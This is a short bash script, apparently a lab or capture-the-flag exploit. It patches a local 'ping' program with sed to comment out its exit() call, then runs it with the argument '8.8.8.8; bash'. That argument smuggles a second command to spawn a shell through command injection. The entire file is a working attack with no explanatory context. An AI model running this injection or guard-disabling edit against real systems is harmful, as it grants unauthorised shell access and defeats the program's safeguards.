#!/usr/bin/env bash

sed -i 's/exit()/#exit()/' ping
./ping '8.8.8.8; bash'
